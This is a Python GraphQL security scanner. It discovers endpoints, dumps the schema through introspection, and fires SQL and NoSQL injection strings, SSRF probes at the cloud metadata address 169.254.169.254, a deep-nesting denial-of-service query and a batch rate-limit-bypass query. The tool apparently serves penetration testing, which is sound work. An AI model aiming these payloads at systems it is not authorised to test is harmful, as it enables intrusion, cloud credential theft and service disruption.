#!/usr/bin/env python3
"""
NOVA GRAPHQL TESTER v1.0
Autonomous GraphQL security testing — introspection abuse, injection,
depth attacks, field suggestion exploitation, batch attacks, and auth bypass.
"""
import json, re, urllib.request, urllib.error
from typing import Dict, List, Tuple
from datetime import datetime

INTROSPECTION_QUERY = '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name kind}}}}}}"}'

SQLI_PROBES = [
    '{"query":"{users(id:\\"1 OR 1=1\\"){id email}}"}',
    '{"query":"{search(q:\\"test\' OR \'1\'=\'1\\"){results}}"}',
]
NOSQLI_PROBES = [
    '{"query":"{user(filter:\\"{$gt:\\"\\"}\\"){id email password}}"}',
]
SSRF_PROBES = [
    '{"query":"{import(url:\\"http://169.254.169.254/latest/meta-data/\\"){content}}"}',
    '{"query":"{fetchUrl(url:\\"http://127.0.0.1:80/\\"){body}}"}',
]
DEPTH_ATTACK = '{"query":"{user{posts{comments{author{posts{comments{author{id}}}}}}}}"}'
BATCH_ATTACK  = '[{"query":"{user(id:1){id}}"}, {"query":"{user(id:2){id}}"}, {"query":"{user(id:3){id}}"}]'
INTROSPECTION_DISABLE_CHECK = '{"query":"{ __schema { types { name } } }"}'

SENSITIVE_TYPES  = ['User','Admin','Token','Secret','Password','Credential','Key','Config','Internal']
SENSITIVE_FIELDS = ['password','secret','token','apiKey','apiSecret','ssn','creditCard','privateKey']


def _post(url, body, headers=None, timeout=10):
    h = {"Content-Type": "application/json", **(headers or {})}
    req = urllib.request.Request(url, data=body.encode() if isinstance(body,str) else body, method="POST")
    for k,v in h.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try: body2 = e.read().decode("utf-8","replace")
        except: body2 = ""
        return e.code, body2
    except Exception as e:
        return 0, str(e)


class NovaGraphQLTester:
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip("/")
        self.headers  = {"Authorization": f"Bearer {token}"} if token else {}
        self.findings: List[Dict] = []
        self.schema: Dict = {}

    def _find_endpoints(self):
        candidates = ["/graphql","/api/graphql","/graphiql","/v1/graphql","/query","/__graphql"]
        found = []
        for c in candidates:
            url = self.base_url + c
            code, body = _post(url, INTROSPECTION_DISABLE_CHECK, self.headers)
            if code == 200 and "data" in body:
                found.append(url)
        return found

    def _introspect(self, url):
        code, body = _post(url, INTROSPECTION_QUERY, self.headers)
        if code == 200:
            try:
                data = json.loads(body)
                self.schema = data.get("data", {}).get("__schema", {})
                return True
            except: pass
        return False

    def _check_sensitive_schema(self, url):
        findings = []
        types_ = self.schema.get("types", [])
        for t in types_:
            if any(s.lower() in (t.get("name") or "").lower() for s in SENSITIVE_TYPES):
                fields = [f["name"] for f in (t.get("fields") or []) if f]
                sensitive = [f for f in fields if any(s.lower() in f.lower() for s in SENSITIVE_FIELDS)]
                if sensitive:
                    findings.append({
                        "type": "GraphQL Sensitive Schema Exposure",
                        "severity": "HIGH",
                        "endpoint": url,
                        "gql_type": t["name"],
                        "sensitive_fields": sensitive,
                        "description": f"Type {t['name']} exposes sensitive fields: {sensitive}",
                    })
        return findings

    def _probe_injections(self, url):
        findings = []
        for probe in SQLI_PROBES + NOSQLI_PROBES:
            code, body = _post(url, probe, self.headers)
            if code == 200 and "data" in body and '"errors"' not in body[:50]:
                findings.append({
                    "type": "GraphQL Injection",
                    "severity": "CRITICAL",
                    "endpoint": url,
                    "probe": probe[:100],
                    "description": "GraphQL query accepted injection-style payload without error",
                })
        for probe in SSRF_PROBES:
            code, body = _post(url, probe, self.headers)
            if code == 200 and "data" in body:
                findings.append({
                    "type": "GraphQL SSRF",
                    "severity": "CRITICAL",
                    "endpoint": url,
                    "description": "GraphQL mutation/query may allow SSRF via URL argument",
                })
        return findings

    def _probe_depth(self, url):
        code, body = _post(url, DEPTH_ATTACK, self.headers)
        if code == 200 and "data" in body:
            return [{"type": "GraphQL Depth Attack (DoS)", "severity": "MEDIUM", "endpoint": url,
                     "description": "No query depth limit — deeply nested queries accepted"}]
        return []

    def _probe_batch(self, url):
        code, body = _post(url, BATCH_ATTACK, self.headers)
        if code == 200 and isinstance(json.loads(body if body.startswith("[") else "[]"), list):
            return [{"type": "GraphQL Batch Query Attack", "severity": "MEDIUM", "endpoint": url,
                     "description": "Batch queries enabled — can be abused to bypass rate limiting"}]
        return []

    def _check_introspection_exposed(self, url):
        code, body = _post(url, INTROSPECTION_DISABLE_CHECK, {})  # no auth
        if code == 200 and "__schema" in body:
            return [{"type": "GraphQL Introspection Enabled (Unauthenticated)", "severity": "MEDIUM",
                     "endpoint": url,
                     "description": "GraphQL introspection exposed without authentication — reveals full schema"}]
        return []

    def run(self):
        print(f"\n⚡ NOVA GRAPHQL TESTER — {self.base_url}")
        print("=" * 60)
        endpoints = self._find_endpoints()
        if not endpoints:
            print("  ℹ️  No GraphQL endpoints found")
            return []
        all_findings = []
        for url in endpoints:
            print(f"\n  📡 Testing: {url}")
            all_findings.extend(self._check_introspection_exposed(url))
            if self._introspect(url):
                all_findings.extend(self._check_sensitive_schema(url))
            all_findings.extend(self._probe_injections(url))
            all_findings.extend(self._probe_depth(url))
            all_findings.extend(self._probe_batch(url))
        self.findings = all_findings
        print(f"\n  📊 GraphQL: {len(all_findings)} findings")
        return all_findings

    def save(self, path):
        with open(path,"w") as f:
            json.dump({"generated": datetime.now().isoformat(),"findings": self.findings}, f, indent=2)
        print(f"  💾 GraphQL report → {path}")


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    t = NovaGraphQLTester(target)
    t.run(); t.save("nova_graphql_report.json")
